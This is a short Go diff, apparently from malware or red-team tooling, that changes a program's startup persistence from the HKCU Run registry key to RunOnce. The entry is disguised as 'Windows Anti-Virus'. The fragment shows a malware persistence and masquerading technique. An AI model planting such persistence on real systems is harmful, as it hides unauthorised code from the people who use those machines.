@@ -5,5 +5,5 @@ import (
 )
 
 func main() {
-	persistence.AddStartupUsingHkcuRun("Windows Anti-Virus")
+	persistence.AddStartupUsingHkcuRunOnce("Windows Anti-Virus")
 }
